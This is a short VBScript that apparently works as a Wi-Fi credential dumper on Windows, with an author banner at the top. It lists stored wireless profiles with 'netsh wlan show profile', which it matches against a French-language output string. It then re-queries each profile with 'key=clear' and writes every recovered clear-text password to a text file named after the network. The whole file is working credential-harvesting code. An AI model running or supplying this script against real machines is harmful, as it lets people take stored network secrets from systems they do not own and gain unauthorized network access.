'//////////////////////////////////////////////
'//                  ε013
'//          Jordan Dalcq - 0v3rl0w
'/////////////////////////////////////////////'

Function GetOutput(command)
  Set Shell = Wscript.CreateObject("WScript.Shell")
  Set cmd = Shell.Exec("cmd /c  " & command)
  strOut = ""

  Do While Not cmd.StdOut.AtEndOfStream
    strOut = strOut & cmd.StdOut.ReadLine() & "\n"
  Loop
  GetOutput=strOut
End Function

Function saveIt(wifi, passwd)
  Set objFSO=CreateObject("Scripting.FileSystemObject")
  Set objFile=objFSO.CreateTextFile(wifi & ".txt")
  objFile.Write(passwd)
  objFile.Close
End Function
strText=Split(GetOutput("netsh wlan show profile"), "\n")

For Each x In strText
  If InStr(x, "Profil Tous") Then
    txt=Split(x, ": ")
    i = 0
    For Each Name In txt
      If i Mod 2 Then
        str=Split(GetOutput("netsh wlan show profile """ & Name & """ key=clear"), "\n")
        j = 0
        found = false
        For Each Password In str
          If j = 32 Then
            passwd=Split(Password, ": ")(1)
            found = true
          End If
          j = j + 1
        Next

        If found Then
          saveIt name, passwd
        End If
      End If
      i = i + 1
    Next
  End If
Next
